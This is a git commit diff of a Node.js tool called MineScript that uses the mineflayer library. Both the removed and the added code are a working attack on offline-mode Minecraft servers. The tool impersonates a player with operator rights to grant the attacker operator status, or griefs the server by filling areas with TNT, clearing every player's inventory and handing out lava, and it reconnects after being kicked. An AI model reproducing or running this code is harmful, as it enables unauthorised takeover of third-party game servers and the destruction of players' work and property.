9a52d2b51e38b0a4d535b75f01175a66c554e63e
Mega <yanivwhat@gmail.com>
2022-02-22 14:01:38 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,169 +1,63 @@
-const fs = require('fs');
 const mineflayer = require('mineflayer')
-
-var setTitle = require('console-title');
-var readline = require('readline');
-var colors = require('colors');
-var childProcess = require('child_process');
-
-var rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
-  });
-setTitle('MineScript (By MegaGangster)');
-const cracked = "./cracked.js"
-
-
-const request = require('request')
-
-
-//First Selection.
-
-rl.question("Target Server ip: ".brightBlue, function(ip) {
+const prompt = require("prompt-sync")();
 
 
 
 
-//Menu.
-console.clear();
-console.log("Welcome, tool created by MegaGangster".brightRed + "\nStill in beta.".red)
-console.log(" ")
-console.log(" ")
-console.log(" ")
-console.log(" ")
-console.log("Select option.".brightYellow)
-console.log(" ")
-console.log("1, Connect to the server with the client's alt - Cracked servers.")
-console.log(" ")
-console.log("2, Start a port scan, and find bungeecord ports to hack to - Bungeecord servers. (Advanced Users)")
-console.log(" ")
-console.log(" ")
+Main()
+async function Main(){
 
+const ip = prompt("Target IP: ");
 
+const opname = prompt("OP username (a player's name of who has op permission): ")
 
-rl.question("Your answer: ".brightBlue, function(a) {
+const select = prompt("What do you prefer, Grant yourself op (type 1) OR Grief the server (type 2): ")
 
-if(a == 1) {
+let yourname = ''
 
-    console.clear();
-    console.log("Current target: " + ip.brightRed)
-    console.log("")
-    console.log("")
-    var url = 'https://api.mcsrvstat.us/2/' + ip;
-
-
-    
-
-    console.log("")
-    console.log("Select option.".green)
-    console.log("")
-    console.log("1, login to the server with a server operator's username and promote you. (OP username required)")
-    console.log("2, Grief the server, fun L (OP username required)")
-    
-    
-    rl.question("Your option: ".brightBlue, function(bb) {
-    
-    
-    if(bb == 1){
-    
-console.log("\n")
-        
-        rl.question("Type a username of someone who has OP permission: ", function(username) {
-        
-    
-            rl.question("Your username: ", function(yourusername) {
-              const bot = mineflayer.createBot({
-                    host: ip,
-                    username: username,
-                  });
-        
-                  bot.on('spawn', m=>{
-                    bot.chat("/op " + yourusername)
-                  })
-                });
-        
-        
-            });
-
-         } else if(bb == 2) {
-        rl.question("Type a username of someone who has OP permission: ", function(username) {
-            const bot = mineflayer.createBot({
-                host: ip,
-                username: username,
-              });
-              
-              bot.on('spawn', m=>{
-                bot.chat("/fill ~ ~ ~ ~50 ~20 ~29 minecraft:tnt")
-                bot.chat('/fill ~ ~ ~ ~3 ~3 ~3 minecraft:redstone_block')
-                bot.chat('/gamemode creative @a')
-                bot.chat('/tp @a @p')
-                bot.chat('/clear @a') 
-                bot.chat('/give @a minecraft:flint_and_steel')
-                bot.chat('/give @a minecraft:tnt')
-                bot.chat('/give @a minecraft:lava_bucket')
-                console.log("<3")
-              })
-    
-        })
-    
-    }else {console.log("pls type a correct option.")} return
-    })
-
-
-
-
-
-
-
-
-
-
-
-
-} else if(a == 2) {
-  console.log("Feature still in development.".brightRed)
-  return;
+if(select === "1"){
+  yourname = prompt("Your account username: ")
 }
 
 
+Login(ip, opname, select, yourname)
 
 
 
 
 
+}
 
 
-})
-
-
-
-})
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+async function Login(ip, opname, select, yourname){
+  const bot = mineflayer.createBot({
+    host: ip,
+    username: opname,
+  });
+  
+  bot.once('spawn', m=>{
+  
+    if(select === "1"){
+      bot.chat("/op " + yourname)
+      console.log('OP granted for ' + yourname)
+    } 
+    if(select === "2"){
+  
+      bot.chat("/fill ~ ~ ~ ~50 ~20 ~29 minecraft:tnt")
+      bot.chat('/fill ~ ~ ~ ~3 ~3 ~3 minecraft:redstone_block')
+      bot.chat('/gamemode creative @a')
+      bot.chat('/tp @a @p')
+      bot.chat('/clear @a') 
+      bot.chat('/give @a minecraft:flint_and_steel')
+      bot.chat('/give @a minecraft:tnt')
+      bot.chat('/give @a minecraft:lava_bucket')
+      console.log('Griefed!')
+    }
+  
+  })
+  
+  bot.once('kicked', reason =>{
+    console.log('bot was kicked, reason: ' + reason + '\ntrying to reconnect')
+    Login(ip, opname, select, yourname)
+  })
+}
